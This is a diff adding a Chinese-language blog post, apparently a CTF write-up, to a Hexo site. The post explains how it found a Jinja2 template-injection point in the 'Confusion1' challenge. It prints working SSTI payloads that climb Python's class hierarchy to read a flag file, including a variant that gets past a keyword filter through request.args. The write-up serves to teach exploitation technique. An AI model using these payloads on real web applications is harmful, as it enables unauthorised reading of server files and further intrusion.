@@ -228,6 +228,142 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/15/Confusion1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Richard LEE">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="RichardLEE's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/03/15/Confusion1/" itemprop="url">Confusion1</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-15T14:48:34+08:00">
+                2020-03-15
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="Confusion1"><a href="#Confusion1" class="headerlink" title="Confusion1"></a>Confusion1</h2><p>好久没有做SSTI的题目了，借着这道题目回忆一下，首先提示要看明白图片并且找到用户的输入点。</p>
+<p><img src="/2020/03/15/Confusion1/1.png" alt></p>
+<p>这个图画了个大蟒蛇，基本可以确定是在暗示Python了。随便点开一个Login发现是404，查看源代码发现flag的位置:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">HTML</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">"-//IETF//DTD HTML 2.0//EN"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>404 Not Found<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Not Found<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>The requested URL /login.php was not found on this server.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">address</span>&gt;</span>Apache/2.4.10 (Debian) Server at vps1.blue-whale.me Port 23361<span class="tag">&lt;/<span class="name">address</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Flag @ /opt/flag_1234qwerty.txt --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>因此进一步明确思路要读取/opt/flag_1234qwerty.txt必须要找到用户的输入点，这也是提示的第一条。根据经验应该是Python jinja2的SSTI了，在url里输入<a href="http://vps1.blue-whale.me:23361/login.php" target="_blank" rel="noopener">http://vps1.blue-whale.me:23361/login.php</a>2发现得到了回显，注入点就算是找到了。</p>
+<p><img src="/2020/03/15/Confusion1/2.png" alt></p>
+<p>回顾模板注入的操作：</p>
+<p>获取基本类-获取基本类的子类-寻找命令执行模块</p>
+<p>正常情况下构造payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#39;.__class__.__mro__[2].__subclasses__()[40](&quot;&#x2F;opt&#x2F;flag_1234qwerty.txt&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>.<strong>class_代表基本类 __mro</strong>方法可打印出其继承关系返回的是一个元组，通过下标+<strong>subclasses</strong>的方法可以获取所有子类的列表。而<strong>subclasses</strong>()第40个是file类型的object。但是这个题把class这些字符给过滤了，因此利用flask的request.args进行绕过，最终paylaod为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#39;&#39;[request.args.a][request.args.b][2][request.args.c]()[40](&#39;&#x2F;opt&#x2F;flag_1234qwerty.txt&#39;)[request.args.d]()&#125;&#125;?a&#x3D;__class__&amp;b&#x3D;__mro__&amp;c&#x3D;__subclasses__&amp;d&#x3D;read</span><br></pre></td></tr></table></figure>
+
+
+
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/14/Global-Page/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1041,7 +1177,7 @@
               
                 <a href="/archives/%7C%7C%20archive">
               
-                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-count">16</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
